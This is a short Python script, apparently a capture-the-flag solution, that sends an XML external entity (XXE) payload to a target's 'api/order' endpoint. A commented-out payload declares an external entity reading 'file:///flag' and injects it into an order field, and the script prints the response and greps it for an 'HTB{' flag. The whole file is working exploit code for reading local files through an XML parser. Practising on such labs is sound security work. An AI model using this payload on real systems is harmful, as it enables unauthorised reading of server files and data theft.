#!/usr/bin/python3
from re import findall
from sys import argv

from requests import post

# data = """
# 		<?xml version="1.0" encoding="UTF-8" ?>
# 		<!DOCTYPE user [<!ENTITY internal SYSTEM "file:///flag">]>  
# 		<root>
# 			<table_num>1</table_num>
# 			<food>Ice Scream:&internal;</food>
# 		</root>
# 		"""
data = {"reqxml" : (None, open("payload.xml", "rb"))}	
#print(data)

headers = {"Content-Type": "application/xml", 
			"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0"}


r = post(argv[1] + "api/order", data=data, headers=headers)


print(r.text)
#print(findall("HTB{.*", r.text)[0])